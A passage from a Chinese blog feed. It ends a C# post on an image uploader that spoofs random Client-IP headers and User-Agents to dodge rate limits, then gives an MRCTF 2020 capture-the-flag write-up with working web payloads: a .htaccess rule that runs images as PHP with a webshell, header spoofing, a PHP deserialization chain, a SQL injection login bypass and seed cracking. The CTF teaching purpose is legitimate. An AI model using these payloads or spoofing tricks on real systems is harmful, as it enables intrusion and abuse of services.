class="string">&quot;Error:API Failed to upload for 5 times!&quot;</span>);</span><br><span class="line">Thread.CurrentThread.Abort();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传完成后，把得到的链接次序输出。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; imageQuantity; i++)&#123;</span><br><span class="line">Console.WriteLine(fetchedUrl[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成之后将程序编译并放在喜欢的位置并配置好 Typora 的上传。（有空格的目录需要按 <code>dir /x</code> 下的目录给定，譬如 <code>X:\PROGRA~2\PicAlicdnForTypora\PicAlicdnForTypora.exe</code>）在 Typora 的测试通过后即可正常使用。</p><h3 id="BUG-修复"><a href="#BUG-修复" class="headerlink" title="BUG 修复"></a>BUG 修复</h3><h4 id="上传请求次数过多导致无法成功"><a href="#上传请求次数过多导致无法成功" class="headerlink" title="上传请求次数过多导致无法成功"></a>上传请求次数过多导致无法成功</h4><p>之前的程序没有考虑到一次性粘贴大量图片的上传，结果导致在进行相关操作的时候图片几乎完全无法上传成功。于是在这次的更新中增加了一点小策略。</p><p>在每次请求时从准备好的 User-Agent 中随机抽取，同时随机生成 Client-IP，将其二者合并到构造的请求中。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uploadRespose = uploadUrl.WithHeaders(<span class="keyword">new</span> &#123;</span><br><span class="line">                    User_Agent = userAgents[randomNum.Next(<span class="number">4</span>)],</span><br><span class="line">                    Client_IP = randomNum.Next(<span class="number">192</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">                &#125;).PostMultipartAsync(data =&gt; </span><br><span class="line">                    data.AddString(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;multipart&quot;</span>)</span><br><span class="line">                        .AddFile(<span class="string">&quot;Filedata&quot;</span>,args[i])</span><br><span class="line">                ).Result;</span><br></pre></td></tr></table></figure><p>同时，使用 <code>Thread.Sleep(300)</code> 在每次处理完请求后使线程暂停 300 毫秒。这样可以有效地防止因为上传请求过于频繁而上传失败的问题。</p><h4 id="Content-Type-编码报错"><a href="#Content-Type-编码报错" class="headerlink" title="Content-Type 编码报错"></a>Content-Type 编码报错</h4><p>这个 BUG 我感觉比较奇怪，在请求的响应中，有一定概率会把 Content-Type 中的 utf-8 返回成 utf8。但是有的时候却是正常的。因此这需要使用到 .Net 4.6+ 的一个新特性 <code>EncodingProvider</code> 子类，相关的文档<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.text.encoding.registerprovider?redirectedfrom=MSDN&view=netframework-4.7.2">在这里</a>。这个新的特性允许自定义一个编码类型，所以我们可以使用它构建一个 utf8 的类型然后返回 UTF-8 的编码类型使得解析可以正常进行。相关参考来自 <a href="https://stackoverflow.com/questions/47711849/unable-to-receive-response-using-restease/47716537#47716537">Stack Overflow</a>。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EquivocalUtf8EncodingProvider</span> : <span class="title">EncodingProvider</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Encoding <span class="title">GetEncoding</span>(<span class="params"><span class="built_in">string</span> name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> name == <span class="string">&quot;utf8&quot;</span> ? Encoding.UTF8 : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Encoding <span class="title">GetEncoding</span>(<span class="params"><span class="built_in">int</span> codepage</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">EncodingProvider provider = <span class="keyword">new</span> EquivocalUtf8EncodingProvider();</span><br><span class="line">Encoding.RegisterProvider(provider);</span><br></pre></td></tr></table></figure><h4 id="文件名包含中文时上传失败"><a href="#文件名包含中文时上传失败" class="headerlink" title="文件名包含中文时上传失败"></a>文件名包含中文时上传失败</h4><p>因为一开始文件的上传依赖于文件名（具体见上面的请求部分代码），所以一直不知道怎么解决好。偶然看了一下方法的重载，发现可以上传 Stream。于是就有了先把文件读入成 Stream 上传之后再 Dispose 的思路。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FileStream uploadImg = <span class="keyword">new</span> FileStream(args[i],FileMode.Open,FileAccess.Read, FileShare.Read);</span><br><span class="line"><span class="built_in">byte</span>[] bytesImg = <span class="keyword">new</span> <span class="built_in">byte</span>[uploadImg.Length];</span><br><span class="line">uploadImg.Read(bytesImg, <span class="number">0</span>, bytesImg.Length);</span><br><span class="line">uploadImg.Close();</span><br><span class="line">Stream uploadImgStream = <span class="keyword">new</span> MemoryStream(bytesImg);</span><br><span class="line">                </span><br><span class="line"><span class="keyword">var</span> uploadRespose = uploadUrl.WithHeaders(<span class="keyword">new</span> &#123;</span><br><span class="line">                    User_Agent = userAgents[randomNum.Next(<span class="number">4</span>)],</span><br><span class="line">                    Client_IP = randomNum.Next(<span class="number">192</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>)</span><br><span class="line">                &#125;).PostMultipartAsync(data =&gt; </span><br><span class="line">                    data.AddString(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;multipart&quot;</span>)</span><br><span class="line">                        .AddFile(<span class="string">&quot;Filedata&quot;</span>,uploadImgStream,WebUtility.UrlEncode(args[i]))</span><br><span class="line">                ).Result;</span><br><span class="line">                </span><br><span class="line">uploadImgStream.Dispose();</span><br></pre></td></tr></table></figure><p>这样之后，无法上传含有中文字符作文件名的文件的问题迎刃而解。</p><h4 id="带协议的文件路径导致上传失败"><a href="#带协议的文件路径导致上传失败" class="headerlink" title="带协议的文件路径导致上传失败"></a>带协议的文件路径导致上传失败</h4><p>Typora 支持使用 <code>file:///</code> 协议来插入图片，但是在调用的时候却只会去掉 <code>file://</code> 导致一个 <code>/</code> 被保留在文件路径参数中，导致文件无法被正常读取而报错。在尝试过之后发现，以 <code>/</code> 开头的文件路径没有办法成功地插入一张图片，所以这波刚好只需要在尝试在读取文件之前过滤一个字符 <code>/</code>。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;/&#x27;</span> == args[i][<span class="number">0</span>])&#123;</span><br><span class="line">args[i] = args[i].Substring(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在测试的时候，发现即使是在线引用的图片也有可能被调用上传，所以根据可以引用的几种协议判断一下直接返回原本的地址以避免出错。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args[i].Contains(<span class="string">&quot;http://&quot;</span>) || args[i].Contains(<span class="string">&quot;https://&quot;</span>) || args[i].Contains(<span class="string">&quot;ftp://&quot;</span>))&#123;</span><br><span class="line">fetchedUrl[i] = args[i];</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用原始接口的再开发">使用原始接口的再开发</h3><p>真的不得不说，原来的接口真的，各种奇奇怪怪的问题。这回终于找到了原始的接口 <a href="https://github.com/iAJue/Alibaba_pic/blob/master/update.php">来源</a>，兴奋之余开了个新的 solution 修订一波原来的代码，在这里分析一二。</p><p>接口的地址是 <code>https://kfupload.alibaba.com/mupload</code>，主要有这么几个参数。</p><table><thead><tr><th align="left">参数名称</th><th align="left">必填</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">scene</td><td align="left">是</td><td align="left">string</td><td align="left">固定值“aeMessageCenterV2ImageRule”</td></tr><tr><td align="left">name</td><td align="left">是</td><td align="left">string</td><td align="left">文件名</td></tr><tr><td align="left">file</td><td align="left">是</td><td align="left">stream</td><td align="left">文件流</td></tr></tbody></table><p>除此之外，必须指定 <code>mediaType</code> 且大概只支持 png/jpg/gif 三种，且 Header 中的 <code>User-Agent</code> 须为 <code>iAliexpress/6.22.1 (iPhone; iOS 12.1.2; Scale/2.00)</code>。其他部分可以依照前文所述构造 POST 请求。</p><hr><a class="button is-light is-small" href="https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@382637d801f6034fc18cf7160225ba7dda310fab/source/PicAliCdnForTypora_0.1.5.3.cs"><span>Download Source</span></a>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF 2020</title>
      <link href="/zh-CN/posts/9c2f22e.html"/>
      <url>/zh-CN/posts/9c2f22e.html</url>
      
        <content type="html"><![CDATA[<p>这波比赛终于写上了几题 Web 的题，感觉挺开心了，虽然过程有点曲折（说到底还是我菜 不过学到了一些东西，也使自己的思路更清晰了一些。</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>很开心的是这次把有思路的 Web 题目都写出来了，虽然 Typecho 那题也应该能写出来的，可惜的是还没找到切入点，思路出了问题。至于 WASM 那题，完全都没接触过，所以自然不知道怎么下手手。这波感觉 Misc 的题目用了很多新的东西，也充分地跟声波斗智斗勇了，虽然最后没完全写出来，也学了不少东西。至于 Crypto 嘛，认真写了的题里倒是没啥新奇的。</p><h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>虽然这次没有因为一道题而不去看其他的，但是出现了新的问题，一个单词的拼写浪费了大量的时间去检查，应该更加细心一点的。另外一点就是熟悉的东西真的太少了，会的东西也很少QAQ</p><h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">is_numberic</span><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p><p>这题感觉是直白的代码审计，一上来就给了段代码。稍微看了一下之后发现两个点，MD5的 <code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code> 可以简单地用数组绕过。<code>is_numberic</code> 可以加个 <code>%0</code> 来绕过。因此，直接传两个 GET 参数 <code>id[]=1&amp;gg[]=2</code> 加上一个 POST 参数 <code>passwd=1234567%0</code> 即可拿到 flag。</p><h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Apache · htaccess</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Upload</span></p><p>这题一开始我没注意到用的 Apache 然后疯狂尝试各种改包，结果都失败了。其实要先上传个 .htaccess，这是 Apache 独有的机制。（当然 nginx 也可以用不一样的方法实现，甚至使 nginx 支持 .htaccess）因此，写个 .htaccess 使 jpg 文件解析为 php 从而执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;crack.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>值得注意的是，要先拦截这个数据包然后修改 <code>Content-Type</code> 才能成功上传，也可以先选一张图片，然后修改 <code>filename</code> 和内容（我就是用的这个套路）。完成之后再写一段一句话木马，记事本存起来拓展名改成 <code>.jpg</code> 就好。然后上传之后尝试访问一下，没问题之后直接拿菜刀连上去根目录找 flag。（其实是因为试了几次之后发现 <code>system()</code> 啥的都没给，其实还可以用 <code>include()</code> 啥的，但是当时想着，不如直接上菜刀）</p><h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Char</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Strings · Request</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">JSFuck</span></p><p>上来看一手页面源码，于是找到了第一步。要求大概是要 <code>b_u_p_t</code> 但是不给 <code>_</code>，加一个简单的正则绕过。于是构造一波 <code>...？b.u.p.t=23333%0a</code> 成功拿到下一步线索 <code>FLAG is in secrettw.php</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 <code>secrettw.php</code> 之后发现页面源码中有一段 JSFuck，丢到 Console 里面执行一下，提示 <code>post me Merak</code>。于是照着尝试了一下，拿到一段代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先照着代码给的要求构造 GET 请求，因为有个 <code>file_get_contents()</code> 函数，所以构造 <code>$_GET[&#39;2333&#39;]</code> 有两种方法，<code>php://input</code> + POST 或者直接用 <code>data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</code> 来构造。观察到 <code>$_GET[&#39;file&#39;]</code> 这个文件会首先被 <code>change()</code> 然后再输出文件内容，所以需要先把 flag.php 倒着 <code>change()</code> 一次，这样之后就能输出 flag.php 从而拿到 flag。于是写一波 <code>RecChange()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RecChange</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$re</span> = base64_encode(<span class="variable">$re</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 flag.php <code>RecChange()</code> 之后拼接到 payload 中。在看代码，要求 <code>$ip === 127.0.0.1</code>，于是用 <code>Client-IP: 127.0.0.1</code> 这个 header 达成。于是 payload 构造完成，得到 <code>.../secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</code>。最后，根据代码，去除掉最开始的 POST 参数，请求之后查看网页源码即得 flag。</p><h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p><p>这题一开始给了个很有梗的网页（事实证明这题都很有梗），找了找网页源码，发现一个 flag.php。直接访问之后又是一个很有梗的页面，关键词是 IP。于是果断试一手 <code>X-Forwarded-For: 127.0.0.1</code>，访问后成功在网页源码中找到 flag。</p><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">PHP 伪协议</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Unserialize</span></p><p>这题一开始就给了一段源码，仔细查看之后知道就是反序列化的考点。很明显，<code>include()</code> 就是可以利用的地方，于是一路往下找，<code>__invoke()</code>，这里要求以调用函数的方式调用一个对象。这点使用 <code>__get()</code> 可以实现，而这又要求获取一个类中不可达的属性。在 <code>__wakeup()</code> 中有一个 <code>$this-&gt;source</code> 的参数，使得 <code>source</code> 被当作一个字符串而触发 <code>__toString()</code>。而恰好 <code>__toString()</code> 可以触发 <code>__get()</code>。这样一系列的触发就完成了，因为知道 flag 在 flag.php 中，因此要在 <code>include()</code> 中使用 php 伪协议来包含这个文件。于是稍加修改代码然后得到序列化的结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$p2</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$p2</span>-&gt;p = <span class="variable">$p1</span>;</span><br><span class="line"><span class="variable">$p3</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$p3</span>-&gt;str = <span class="variable">$p2</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$exp</span>-&gt;source = <span class="variable">$p3</span>;</span><br><span class="line"><span class="variable">$dexp</span> = serialize(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><p>这样就能得到序列化的结果。因为涉及到保护字段，所以在构造 payload 的时候记得把字段名前面的空格恢复成\x00，不然会导致反序列化失效从而无法执行。这里构造完成之后用 Python 或者 BurpSuite 发送数据包之后可以在响应中得到一串 base64 文本，解码后可以找到 flag。</p><h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">php_mt_seed</span></p><p>不愧是好看的 CSS，找了半天没有找到切入点，然后<a href="https://duitutu.cn">堆堆</a>告诉我说有源码。（我没扫出来）于是我就直接下载了一份。不过查看源码的时候找到了 <code>.../login.html</code>，结合源码中的公钥私钥和随机数生成，查了一下搜索引擎之后找到了 php_mt_seed 这个工具。于是将源码注释中给出的公钥整理，然后使用这个工具算出种子。得到的种子是 1775196155。</p><p>设置好种子之后，开始跑私钥。需要注意的是，这个公钥需要使用 PHP 5.6.x 才能够对得上。于是以此生成公钥和私钥，得到的私钥是 XuNhoueCDCGc。将其整合到 payload 中，然后再简单地过一下 password 的 SQL 注入。最后的 POST 数据是这样的 <code>Private_key=XuNhoueCDCGc&amp;login=%E7%99%BB%E5%BD%95&amp;password=1&#39; or 1=1 #&amp;username=admin</code> ，访问之后可得 flag。</p><h3 id="天干地支-甲子"><a href="#天干地支-甲子" class="headerlink" title="天干地支+甲子"></a>天干地支+甲子</h3><p>给出的信息是 <code>甲戌 甲寅 甲寅 癸卯 己酉 甲寅 辛丑</code>，经过大家的提醒之后找了个干支表，对着将每一年转换成了数字 <code>11 51 51 40 46 51 38 </code>。然后题目要求加一个甲子，也就是六十年，加上之后数字变成这样 <code>71 111 111 100 106 111 98</code>，将其进行十进制的编码转换之后，得到了 flag 的内容 <code>Goodjob</code>。</p><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3><p>这题给出的信息是 <code>6 666 22 444 555 33 7 44 666 66 33</code>。观察一下可以发现，1 和 0 都没有出现过，加上数字有重复且不超过三，比较符合九键拼音的键盘。于是尝试解密一波，得到 <code>MOBILEPHONE</code>。此即 flag 的内容。</p><h3 id="vigenere"><a href="#vigenere" class="headerlink" title="vigenere"></a>vigenere</h3><p>这题给了一篇很长的文章，但是出现了很多不一样的单字母，所以判断其应该不是字母替换，加之标题的提示，我成功找到了<a href="https://www.guballa.de/vigenere-solver">这个</a>。将文章放进去之后解密即可在文章末尾得到 flag。</p><h3 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h3><p>这题给了个 zip，还是加密的，但是提示跟名称有关系。于是先上一手爆破，得到了密码之后找到了关系，被压缩的压缩包的密码等于当前压缩包的名称。一开始我准备直接手解来着，但是层数太多了，于是随手码了个 Python 脚本来解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, os</span><br><span class="line"></span><br><span class="line">f = zipfile.ZipFile(os.path.join(os.getcwd(), <span class="string">&#x27;xxxx.zip&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(f.namelist())</span><br><span class="line">passwd = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line">f.extract(f.namelist()[<span class="number">0</span>],<span class="string">r&#x27;path\to\your\folder&#x27;</span>,<span class="built_in">bytes</span>(passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"><span class="keyword">while</span> f.namelist():</span><br><span class="line">    filename = passwd</span><br><span class="line">    passwd = f.namelist()[<span class="number">0</span>][<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">    f = zipfile.ZipFile(os.path.join(os.getcwd(), filename + <span class="string">&#x27;.zip&#x27;</span>))</span><br><span class="line">    f.extract(f.namelist()[<span class="number">0</span>], <span class="string">r&#x27;path\to\your\folder&#x27;</span>, <span class="built_in">bytes</span>(filename.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(passwd)</span><br></pre></td></tr></table></figure><p>跑到程序出错之后得到了最后一层 zip，打开之后得到一串文本，代表着色块的 RGB，且非黑即白。加上 zip 的名称猜测是一个二维码。于是将文本复制下来，放到微软家生产力工具 